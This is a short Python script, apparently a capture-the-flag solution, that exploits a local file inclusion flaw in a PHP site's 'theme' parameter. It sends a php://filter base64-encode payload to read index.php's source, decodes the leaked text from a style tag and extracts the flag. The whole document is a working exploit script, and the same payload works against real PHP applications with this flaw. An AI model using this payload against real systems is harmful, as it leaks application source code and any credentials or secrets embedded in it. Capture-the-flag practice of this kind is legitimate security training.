import requests
import re
import base64

url = 'http://slopgamez.play.ctf.se:13337'

payload = 'php://filter/convert.base64-encode/resource=index.php'

res = requests.get(f'{url}/index.php', params={
    'theme': payload
})

leak = re.findall(r'<style>(.+)</style>', res.text.replace('\n', ''))[0].strip()
leak = base64.b64decode(leak).decode()

flag = re.findall(r'(midnight{.+?})', leak)[0].strip()
print("Flag:", flag)